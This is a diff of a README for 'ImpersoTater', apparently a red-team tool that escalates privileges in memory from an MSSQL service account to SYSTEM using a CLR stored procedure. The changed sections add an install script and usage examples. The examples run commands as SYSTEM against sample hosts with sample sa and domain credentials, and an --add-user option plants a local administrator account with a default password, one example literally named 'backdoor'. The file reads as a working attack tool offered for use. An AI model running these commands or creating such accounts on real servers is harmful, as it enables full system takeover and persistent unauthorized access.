@@ -4,36 +4,39 @@ In-memory privilege escalation from MSSQL service account to `NT AUTHORITY\SYSTE
 
 No executable is written to disk. The entire payload runs inside `sqlservr.exe` as a CLR stored procedure.
 
-## Requirements
+## Install
 
-**Attacker (Linux):**
-- Python 3 with [impacket](https://github.com/fortra/impacket)
-- Mono (`mcs` compiler) for cross-compiling the CLR assembly
+```
+git clone git@github.com:mattmillen15/ImpersoTater.git
+cd ImpersoTater
+./install.sh
+```
 
-**Target:**
-- SQL Server 2012+ with sysadmin access
-- Service account with `SeImpersonatePrivilege` (default for `NT AUTHORITY\NETWORK SERVICE`, `LOCAL SERVICE`, and virtual service accounts)
+This creates a Python venv, installs impacket, installs `mono-mcs` if needed, and creates a `./ImpersoTater` wrapper.
 
 ## Usage
 
 ```
+# Run a command as SYSTEM
+./ImpersoTater -t 192.168.15.42 -u sa -p Password1 -c "whoami"
+
 # Impacket-style target string
-python3 ImpersoTater.py ecorp.local/veeam-admin:'B@ckupP@ssw0rd'@192.168.15.42 -c "whoami"
+./ImpersoTater ecorp.local/veeam-admin:'B@ckupP@ssw0rd'@192.168.15.42 -c "whoami /all"
 
-# Explicit parameters
-python3 ImpersoTater.py -t 192.168.15.42 -u sa -p Password1 -c "whoami /all"
+# Create a local admin (default: tater / Imp3rs0T@ter!)
+./ImpersoTater -t 10.0.0.5 -u sa -p Password1 --add-user
 
-# SQL authentication
-python3 ImpersoTater.py -t 10.0.0.5 -u sa -p Password1 -c "net localgroup administrators"
+# Create local admin with custom creds
+./ImpersoTater -t 10.0.0.5 -u sa -p Password1 --add-user backdoor:P@ssw0rd!
 
 # Select technique
-python3 ImpersoTater.py ecorp/admin:Pass@10.0.0.5 -c "whoami" --technique spooler
+./ImpersoTater ecorp/admin:Pass@10.0.0.5 -c "whoami" --technique spooler
 
 # Enumerate only (no exploitation)
-python3 ImpersoTater.py ecorp/admin:Pass@10.0.0.5 -c x --enum-only
+./ImpersoTater -t 10.0.0.5 -u sa -p Password1 --enum-only
 
 # Leave assembly deployed for multiple commands
-python3 ImpersoTater.py ecorp/admin:Pass@10.0.0.5 -c "whoami" --no-cleanup
+./ImpersoTater ecorp/admin:Pass@10.0.0.5 -c "whoami" --no-cleanup
 ```
 
 ### Options
@@ -48,6 +51,7 @@ python3 ImpersoTater.py ecorp/admin:Pass@10.0.0.5 -c "whoami" --no-cleanup
 | `-w` | Force Windows authentication |
 | `-c CMD` | Command to execute as SYSTEM |
 | `--technique` | `auto`, `spooler`, or `direct` (default: auto) |
+| `--add-user [U:P]` | Create local admin (default: `tater` / `Imp3rs0T@ter!`) |
 | `--no-cleanup` | Leave CLR assembly deployed |
 | `--enum-only` | Only enumerate, don't exploit |
 
@@ -116,9 +120,10 @@ Target: SQL Server 2022 Developer Edition on Windows Server 2019 Datacenter, ser
 
 | File | Description |
 |------|-------------|
-| `ImpersoTater.py` | Python CLI tool — handles connection, compilation, deployment, execution, cleanup |
+| `install.sh` | Setup script — creates venv, installs deps, builds `./ImpersoTater` wrapper |
+| `ImpersoTater.py` | Python CLI — connection, compilation, deployment, execution, cleanup |
 | `ImpersoTater.cs` | C# payload — handle enumeration, token hunting, process creation |
-| `ImpersoTater_sql.cs` | CLR wrapper — SQL stored procedure that calls the payload and returns output via TDS |
+| `ImpersoTater_sql.cs` | CLR wrapper — SQL stored procedure returning output via TDS |
 
 ## Cleanup
 
